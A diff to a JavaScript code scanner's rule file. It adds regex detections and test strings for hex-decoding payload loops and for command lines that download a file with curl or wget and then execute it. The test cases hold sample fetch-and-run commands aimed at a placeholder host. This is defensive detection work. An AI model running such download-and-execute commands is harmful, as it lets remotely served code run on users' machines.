@@ -39,11 +39,15 @@ rules:
         - 'Buffer\s*\.\s*from\s*\([^)]{0,200}?["'']base64["'']'
         - 'decodeURIComponent\s*\(\s*escape\s*\('
         - 'from\s*\(\s*["'']hex["'']\s*\)'
+        # A hand-written hex decoder: two characters at a time through parseInt(..., 16). How a
+        # payload fetched as an innocent-looking "version_hash" becomes a command line.
+        - 'String\s{0,4}\.\s{0,4}fromCharCode\s{0,4}\(\s{0,4}parseInt\s{0,4}\([^\n]{0,80}?,\s{0,4}16\s{0,4}\)\s{0,4}\)'
     tests:
       positive:
         - "const raw = atob(payload);"
         - "const buf = Buffer.from(data, 'base64');"
         - "const s = decodeURIComponent(escape(x));"
+        - "for (let n = 0; n < e.length; n += 2) t += String.fromCharCode(parseInt(e.slice(n, n + 2), 16));"
       negative:
         - "const s = decodeURIComponent(location.search);"
         - "const buf = Buffer.from('plain text');"
@@ -358,9 +362,12 @@ rules:
         # call that follows is named (`request({url, json})`, `got.post`, `needle('post', ...)`).
         - '(?:require\s{0,4}\(|from)\s{0,4}["''](?:request|got|needle|superagent|node-fetch|undici|phin|bent|cross-fetch|isomorphic-fetch|axios)["'']'
         - '\bnet\s*\.\s*(?:connect|createConnection)\s*\('
+        # A download written as a command line in a string the code runs.
+        - '["''`]\s{0,8}(?:curl|wget)(?:\.exe)?\s[^\n]{0,200}?https?://'
     tests:
       positive:
         - "await fetch(endpoint, { method: 'POST' });"
+        - "run('curl -fsSL https://example.invalid/i.sh')"
         - "navigator.sendBeacon(url, payload);"
         - "const http = require('https');"
         - "const http = require('node:http');"
@@ -575,6 +582,39 @@ rules:
       negative:
         - "JSON.parse(text)"
         - "structuredClone(obj)"
+
+  - id: CAP.JS.COMMAND_FETCH_RUN.001
+    version: 1.0.0
+    category: policy
+    severity: info
+    confidence: high
+    capability: fetch_exec
+    title: A command line that downloads an executable and runs it
+    message: >
+      This file holds a command line that downloads to an executable file and
+      runs it in the same line -- one `&&` later, or after making it
+      executable. Written as a string, it is what the code hands to
+      child_process; what runs is whatever the remote host served.
+    remediation: >
+      Ship the program, or verify the download against a known digest before
+      it runs.
+    languages: [javascript, typescript]
+    baseline_hits: 0
+    match:
+      kind: regex
+      patterns:
+        # Matched inside a string by design: in JavaScript a quoted command line is how
+        # one is written before it reaches exec(). Not a `| sh` install hint, which is
+        # what the quoted-pipeline exception is for -- this is a file written and run.
+        - '\b(?:curl|wget)(?:\.exe)?\s[^\n]{0,300}?\s-o\s[^\n]{0,200}?\.(?:bat|cmd|exe|ps1|vbs|scr)\b[^\n]{0,16}?&&[^\n]{0,80}?\.(?:bat|cmd|exe|ps1|vbs|scr)\b'
+        - '\b(?:curl|wget)\s[^\n]{0,300}?\s-o\s[^\n]{0,200}?&&\s{0,4}chmod\s{1,4}\+x\s[^\n]{0,200}?&&'
+    tests:
+      positive:
+        - "s('curl -s -L https://example.invalid/b -o \"%TEMP%\\\\box.bat\" && \"%TEMP%\\\\box.bat\"')"
+        - "exec('wget -q https://example.invalid/x -o /tmp/x && chmod +x /tmp/x && /tmp/x')"
+      negative:
+        - "console.log('Install: curl -fsSL https://example.invalid/i.sh | sh')"
+        - "exec('curl -s -o out.json https://example.invalid/api && cat out.json')"
 
   - id: CAP.JS.SHELL_STDIO_JOINED.001
     version: 1.0.0
